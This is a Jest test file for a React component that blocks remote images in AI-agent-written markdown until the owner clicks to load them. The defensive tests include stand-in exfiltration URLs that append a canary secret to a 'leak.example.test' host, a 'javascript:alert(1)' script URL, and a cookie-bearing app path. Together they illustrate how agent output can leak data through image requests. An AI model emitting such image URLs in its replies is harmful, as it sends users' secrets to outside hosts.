/** @jest-environment jsdom */
import "@testing-library/jest-dom";
import { fireEvent, render, screen } from "@testing-library/react";

import { AGENT_MARKDOWN_COMPONENTS, AgentMarkdownImage } from "../agent-markdown-image";

const REMOTE = "https://leak.example.test/pixel.png?d=CANARY-SECRET";

describe("AgentMarkdownImage", () => {
  it("shows a remote image as a placeholder with its alt text and host, and fetches nothing", () => {
    const { container } = render(<AgentMarkdownImage src={REMOTE} alt="status" />);

    expect(container.querySelector("img")).toBeNull();
    const placeholder = screen.getByRole("button", { name: /status/ });
    expect(placeholder).toHaveTextContent("leak.example.test");
    expect(placeholder.textContent).not.toContain("CANARY-SECRET");
  });

  it("loads the remote image only after the owner clicks the placeholder", () => {
    const { container } = render(<AgentMarkdownImage src={REMOTE} alt="status" />);

    fireEvent.click(screen.getByRole("button", { name: /status/ }));

    expect(container.querySelector("img")).toHaveAttribute("src", REMOTE);
  });

  it("does not carry an approval over to a different image that reuses the same element", () => {
    // Chat rows are keyed by index, so a row that is reused when the owner switches
    // session can hand a new reply's image to an element the owner already approved.
    const APPROVED = "https://good.example.test/chart.png";
    const OTHER = "https://leak.example.test/p.png?d=CANARY-SECRET";
    const { container, rerender } = render(<AgentMarkdownImage src={APPROVED} alt="chart" />);
    fireEvent.click(screen.getByRole("button", { name: /chart/ }));
    expect(container.querySelector("img")).toHaveAttribute("src", APPROVED);

    rerender(<AgentMarkdownImage src={OTHER} alt="chart" />);

    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByRole("button", { name: /chart/ })).toHaveAttribute("title", "Load image from leak.example.test");
  });

  it("asks for a click on the second reply's image when two replies share one list slot", () => {
    const first = "https://good.example.test/chart.png";
    const second = "https://leak.example.test/p.png?d=CANARY-SECRET";
    const Row = ({ src }: { src: string }) => <AgentMarkdownImage src={src} alt="chart" />;
    const { container, rerender } = render(
      <div>{[first].map((src, i) => <Row key={i} src={src} />)}</div>,
    );
    fireEvent.click(screen.getByRole("button", { name: /chart/ }));

    rerender(<div>{[second].map((src, i) => <Row key={i} src={src} />)}</div>);

    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByRole("button", { name: /chart/ })).toBeInTheDocument();
  });

  it.each([
    ["a plain http image", "http://127.0.0.1:9/leak?d=CANARY"],
    ["a protocol-relative image", "//leak.example.test/x.png"],
    ["an app path that would send the owner's cookies", "/api/instances/inst_1/status"],
    ["a blob URL", "blob:https://app.example.test/abc"],
    ["a script URL", "javascript:alert(1)"],
  ])("does not render %s as an image on render", (_label, src) => {
    const { container } = render(<AgentMarkdownImage src={src} alt="chart" />);

    expect(container.querySelector("img")).toBeNull();
  });

  it("names the host of a protocol-relative image, which is where a click sends the query", () => {
    render(<AgentMarkdownImage src="//leak.example.test/x.png?d=CANARY-SECRET" alt="status" />);

    const placeholder = screen.getByRole("button", { name: /status/ });
    expect(placeholder).toHaveAttribute("title", "Load image from leak.example.test");
    expect(placeholder.textContent).not.toContain("unknown host");
    expect(placeholder.textContent).not.toContain("CANARY-SECRET");
  });

  it("names this app for a relative image path, since the browser resolves it on the same origin", () => {
    render(<AgentMarkdownImage src="chart.png" alt="chart" />);

    expect(screen.getByRole("button", { name: /chart/ })).toHaveAttribute("title", "Load image from this app");
  });

  it("renders an inline PNG data image directly, since it needs no request", () => {
    const src = "data:image/png;base64,iVBORw0KGgo=";
    const { container } = render(<AgentMarkdownImage src={src} alt="dot" />);

    expect(container.querySelector("img")).toHaveAttribute("src", src);
  });

  it("falls back to a plain label when the image has no source", () => {
    const { container } = render(<AgentMarkdownImage alt="diagram" />);

    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByText("diagram")).toBeInTheDocument();
  });

  it("is the image override every agent-written markdown renderer uses", () => {
    expect(AGENT_MARKDOWN_COMPONENTS.img).toBe(AgentMarkdownImage);
  });
});
